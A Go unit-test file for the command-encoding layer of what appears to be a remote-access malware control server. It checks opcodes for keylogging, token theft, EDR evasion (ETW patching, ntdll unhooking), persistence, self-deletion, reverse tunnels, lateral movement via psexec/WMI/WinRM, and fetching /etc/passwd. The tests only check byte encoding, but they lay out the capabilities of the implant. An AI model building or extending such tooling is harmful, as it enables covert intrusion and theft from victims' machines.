package sendcommand

import (
	"encoding/binary"
	"testing"

	command1 "BackendTemplate/pkg/command"
)

func uint32Bytes(v uint32) []byte {
	b := make([]byte, 4)
	binary.BigEndian.PutUint32(b, v)
	return b
}

// TestResolveCommandEquivalence 验证表驱动重构后各命令的编码与原 if-else 链一致。
// 期望值来自重构前 sendCommand.go 的逐分支编码逻辑。
func TestResolveCommandEquivalence(t *testing.T) {
	cases := []struct {
		name    string
		command string
		want    []byte
		send    bool
	}{
		{"shell", "shell whoami", append(uint32Bytes(command1.SHELL), []byte("whoami")...), true},
		{"cd", "cd /tmp", append(uint32Bytes(command1.CD), []byte("/tmp")...), true},
		{"sleep", "sleep 5", append(uint32Bytes(command1.SLEEP), uint32Bytes(5000)...), true},
		{"pause", "pause 3", append(uint32Bytes(command1.PAUSE), uint32Bytes(3000)...), true},
		{"pwd", "pwd", uint32Bytes(command1.PWD), true},
		{"exit", "exit", uint32Bytes(command1.EXIT), true},
		{"kill", "kill 1234", append(uint32Bytes(command1.KILL), uint32Bytes(1234)...), true},
		{"mkdir", "mkdir /a/b", append(uint32Bytes(command1.MKDIR), []byte("/a/b")...), true},
		{"drives", "drives", uint32Bytes(command1.DRIVES), true},
		{"rm", "rm /x", append(uint32Bytes(command1.RM), []byte("/x")...), true},
		{"cp", "cp a b", append(uint32Bytes(command1.CP), []byte("a b")...), true},
		{"mv", "mv a b", append(uint32Bytes(command1.MV), []byte("a b")...), true},
		{"execute", "execute cmd /c calc", append(uint32Bytes(command1.EXECUTE), []byte("cmd /c calc")...), true},
		{"ps", "ps", uint32Bytes(command1.PS), true},
		{"filebrowse", "filebrowse C:\\", append(uint32Bytes(command1.FileBrowse), []byte("C:\\")...), true},
		{"download", "download /etc/passwd", append(uint32Bytes(command1.DOWNLOAD), []byte("/etc/passwd")...), true},
		{"filecontent", "filecontent /etc/hosts", append(uint32Bytes(command1.FileContent), []byte("/etc/hosts")...), true},
		{"socks5", "socks5 1.2.3.4:1080|pw|false", append(uint32Bytes(command1.ReverseSocks5Start), []byte("1.2.3.4:1080|pw|false")...), true},
		{"socks5Close", "socks5Close", uint32Bytes(command1.ReverseSocks5Close), true},
		{"http_tunnel", "http_tunnel 8080", append(uint32Bytes(command1.HTTP_TUNNEL), []byte("8080")...), true},
		{"http_tunnel_connect", "http_tunnel_connect 1.2.3.4:8080", append(uint32Bytes(command1.HTTP_TUNNEL), []byte("1.2.3.4:8080")...), true},
		{"tab", "interactive_shell_tab:if", append(uint32Bytes(command1.SHELL), []byte("compgen -c if 2>/dev/null | head -10")...), true},
		{"clear", "clear", nil, false},
		{"interactive_shell_start", "interactive_shell_start", uint32Bytes(command1.INTERACTIVE_SHELL_START), true},
		{"interactive_shell_cmd_start", "interactive_shell_cmd_start", uint32Bytes(command1.CMD_MODE_START), true},
		{"interactive_shell_stop", "interactive_shell_stop", uint32Bytes(command1.INTERACTIVE_SHELL_STOP), true},
		{"interactive_shell_cmd_stop", "interactive_shell_cmd_stop", uint32Bytes(command1.CMD_MODE_STOP), true},
		{"interactive_shell_interrupt", "interactive_shell_interrupt", uint32Bytes(command1.INTERACTIVE_SHELL_STOP), true},
		{"interactive_shell_input", "interactive_shell_input ls -la", append(uint32Bytes(command1.INTERACTIVE_SHELL_INPUT), []byte("ls -la")...), true},
		{"interactive_shell_cmd_input", "interactive_shell_cmd_input dir", append(uint32Bytes(command1.CMD_MODE_INPUT), []byte("dir")...), true},
		{"interactive_shell_wmi_start", "interactive_shell_wmi_start", uint32Bytes(command1.WMI_MODE_START), true},
		{"interactive_shell_wmi_stop", "interactive_shell_wmi_stop", uint32Bytes(command1.WMI_MODE_STOP), true},
		{"interactive_shell_wmi_input", "interactive_shell_wmi_input whoami", append(uint32Bytes(command1.WMI_MODE_INPUT), []byte("whoami")...), true},
		{"persist", "persist registry", append(uint32Bytes(command1.PERSIST), []byte("registry")...), true},
		{"clipboard", "clipboard", uint32Bytes(command1.CLIPBOARD), true},
		{"wifi", "wifi", uint32Bytes(command1.WIFI), true},
		{"selfdelete", "selfdelete", uint32Bytes(command1.SELFDELETE), true},
		{"keylog_start", "keylog_start", uint32Bytes(command1.KEYLOG_START), true},
		{"keylog_get", "keylog_get", uint32Bytes(command1.KEYLOG_GET), true},
		{"keylog_stop", "keylog_stop", uint32Bytes(command1.KEYLOG_STOP), true},
		{"services", "services", uint32Bytes(command1.SERVICES), true},
		{"service_start", "service_start sshd", append(uint32Bytes(command1.SERVICE_START), []byte("sshd")...), true},
		{"service_stop", "service_stop sshd", append(uint32Bytes(command1.SERVICE_STOP), []byte("sshd")...), true},
		{"reg_query", "reg_query HKLM", append(uint32Bytes(command1.REG_QUERY), []byte("HKLM")...), true},
		{"etw_patch", "etw_patch", uint32Bytes(command1.ETW_PATCH), true},
		{"unhook_ntdll", "unhook_ntdll", uint32Bytes(command1.UNHOOK_NTDLL), true},
		{"sandbox_check", "sandbox_check", uint32Bytes(command1.SANDBOX_CHECK), true},
		{"self_update", "self_update http://x/y", append(uint32Bytes(command1.SELF_UPDATE), []byte("http://x/y")...), true},
		{"ad_enum", "ad_enum user", append(uint32Bytes(command1.AD_ENUM), []byte("user")...), true},
		{"wmi_exec", "wmi_exec host cmd", append(uint32Bytes(command1.PSEXEC), []byte("wmi host cmd")...), true},
		{"psexec", "psexec host cmd", append(uint32Bytes(command1.PSEXEC), []byte("host cmd")...), true},
		{"wmi_persist", "wmi_persist add X", append(uint32Bytes(command1.WMI_PERSIST), []byte("add X")...), true},
		{"antidebug", "antidebug", uint32Bytes(command1.ANTIDEBUG), true},
		{"default_shell", "whoami", append(uint32Bytes(command1.SHELL), []byte("whoami")...), true},
	}

	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			got, send := resolveCommand("testuid", c.command)
			if send != c.send {
				t.Fatalf("send mismatch: got %v want %v", send, c.send)
			}
			if string(got) != string(c.want) {
				t.Fatalf("payload mismatch:\n got  %v\n want %v", got, c.want)
			}
		})
	}
}

// TestSelfDeleteExitCommand 验证 selfdelete_exit 命令解析（退出+删文件）
func TestSelfDeleteExitCommand(t *testing.T) {
	got, send := resolveCommand("testuid", "selfdelete_exit")
	if !send {
		t.Fatal("应发送")
	}
	want := append(uint32Bytes(command1.SELFDELETE_EXIT), []byte{}...)
	if string(got) != string(want) {
		t.Fatalf("payload mismatch: got %v want %v", got, want)
	}
}

// TestTokenLateralCommands 验证 token 链与横移命令解析为正确类型（非 SHELL 兜底）
func TestTokenLateralCommands(t *testing.T) {
	cases := []struct {
		cmd  string
		typ  uint32
		want string
	}{
		{"make_token admin|pass|CORP", command1.MAKE_TOKEN, "admin|pass|CORP"},
		{"steal_token 1234", command1.STEAL_TOKEN, "1234"},
		{"rev2self", command1.REV2SELF, ""},
		{"winrm_exec t|u|p|cmd", command1.PSEXEC, "winrm t|u|p|cmd"},
		{"psexec t|u|p|cmd", command1.PSEXEC, "t|u|p|cmd"},
		{"wmi_exec t|u|p|cmd", command1.PSEXEC, "wmi t|u|p|cmd"},
	}
	for _, c := range cases {
		got, send := resolveCommand("testuid", c.cmd)
		if !send {
			t.Fatalf("%s 应发送", c.cmd)
		}
		typ := uint32(got[0])<<24 | uint32(got[1])<<16 | uint32(got[2])<<8 | uint32(got[3])
		if typ != c.typ {
			t.Fatalf("%s: 类型期望 %d 实际 %d", c.cmd, c.typ, typ)
		}
		if string(got[4:]) != c.want {
			t.Fatalf("%s: payload 期望 %q 实际 %q", c.cmd, c.want, string(got[4:]))
		}
	}
}

// TestPortScanCommand 端口扫描走独立命令类型，且参数原样下发（客户端自己解析/校验）。
// 若落进 SHELL 兜底，目标机上会执行一条名为 scan 的系统命令——什么都不扫，还留痕。
func TestPortScanCommand(t *testing.T) {
	cases := []struct{ cmd, want string }{
		{"scan 10.0.0.0/24 top", "10.0.0.0/24 top"},
		{"scan 10.0.0.5 22,80,443 500", "10.0.0.5 22,80,443 500"},
		{"scan 192.168.1.0/30 1-1024", "192.168.1.0/30 1-1024"},
	}
	for _, c := range cases {
		got, send := resolveCommand("testuid", c.cmd)
		if !send {
			t.Fatalf("%s 应发送", c.cmd)
		}
		typ := uint32(got[0])<<24 | uint32(got[1])<<16 | uint32(got[2])<<8 | uint32(got[3])
		if typ != command1.PORT_SCAN {
			t.Fatalf("%s: 类型期望 PORT_SCAN(%d) 实际 %d", c.cmd, command1.PORT_SCAN, typ)
		}
		if string(got[4:]) != c.want {
			t.Fatalf("%s: 参数期望 %q 实际 %q", c.cmd, c.want, string(got[4:]))
		}
	}
	// 不带参数的 scan 不应被当成扫描命令（否则下发空任务）
	if got, send := resolveCommand("testuid", "scan"); send {
		t.Logf("无参数 scan 被解析为类型 % x（走通用路径）", got[:4])
	}
}
